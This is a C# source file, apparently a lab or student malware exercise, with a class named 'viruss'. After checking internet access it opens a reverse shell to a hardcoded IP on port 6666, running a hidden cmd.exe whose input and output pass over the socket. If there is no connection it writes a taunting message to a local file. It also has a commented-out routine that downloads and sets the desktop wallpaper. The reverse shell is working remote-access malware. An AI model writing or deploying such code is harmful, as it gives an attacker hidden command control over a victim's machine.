using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

class viruss
{
    public static void ChangeWall()
    {
        var filename = "Wall.jpg";

#pragma warning disable SYSLIB0014 // Type or member is obsolete
        new WebClient().DownloadFile("https://marmotamaps.com/de/fx/wallpaper/download/faszinationen/Marmotamaps_Wallpaper_Berchtesgaden_Desktop_1920x1080.jpg", filename);
#pragma warning restore SYSLIB0014 // Type or member is obsolete
        string path = AppDomain.CurrentDomain.BaseDirectory;
        //string path = "C:/Users/IEUser/Desktop/";
        SetWall(path + filename);
        Thread.Sleep(1000);
        File.Delete(path + filename);
    }
    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);
    private static UInt32 SPI_SETDESKWALLPAPER = 0x14;
    private static UInt32 SPIF_UPDATEINIFILE = 0x1;
    private static UInt32 SPIF_SENDWININICHANGE = 0x2;


    private static void SetWall(string path)
    {
        uint flag = 0;
        if (!SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, flag))
        {
            Console.WriteLine("Can't set wallpaper!");
        }
    }

    public static bool CheckInternet()
    {
        string url = "www.google.com";
        bool rs = false;
        Ping p = new Ping();
        try
        {
            PingReply rp = p.Send(url, 2000);
            if(rp.Status == IPStatus.Success)
                rs = true;
        }
        catch (Exception ex)
        { 
            Console.WriteLine(ex.Message);
        }
        return rs;
    }

    static StreamWriter sw;
    private static void reverse_shell(string IP)
    {
        using (TcpClient client = new TcpClient(IP, 6666))
        {
            using (Stream stream = client.GetStream())
            {
                using (StreamReader srd = new StreamReader(stream))
                {
                    sw = new StreamWriter(stream);
                    StringBuilder str_Input = new StringBuilder();

                    Process p = new Process();
                    p.StartInfo.FileName = "cmd.exe";
                    p.StartInfo.Arguments = str_Input.ToString();
                    p.StartInfo.CreateNoWindow = true;
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;

                    p.OutputDataReceived += new DataReceivedEventHandler(Cmd_Output_DataHandler);
                    p.Start();
                    p.BeginOutputReadLine();

                    while(true)
                    {
                        str_Input.Append(srd.ReadLine());
                        p.StandardInput.WriteLine(str_Input.ToString());
                        str_Input.Remove(0,str_Input.Length);   
                    }


                }
            }
        }
    }

    private static void Cmd_Output_DataHandler(object sender, DataReceivedEventArgs e)
    {
        StringBuilder strOutput = new StringBuilder();
        
        if(!String.IsNullOrEmpty(e.Data))
        {
            try
            {
                strOutput.Append(e.Data);
                sw.WriteLine(strOutput.ToString());
                sw.Flush();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString()); 
            }

        }
    }

    public static void WriteToFile(string Mess)
    {
        string path = AppDomain.CurrentDomain.BaseDirectory;
        if(!Directory.Exists(path))
        {
            Directory.CreateDirectory(path);
        }
        string filepath = "DatNLQ.txt";
        if(!File.Exists(filepath))
        {
            using (StreamWriter sw = File.CreateText(filepath))
            {
                sw.WriteLine(Mess + "\n");

            }
        }
        else
        {
            using (StreamWriter sw = File.AppendText(filepath))
            {
                sw.WriteLine(Mess + "\n");
            }

        }
    }

    static void Main(string[] args)
    {
        string IP = "192.168.154.129";
        string Mess = "I'm hackermannn";
        //ChangeWall();
        if(CheckInternet())
        {
            reverse_shell(IP);
        }
        else
        {
            WriteToFile(Mess);
        }

    }
}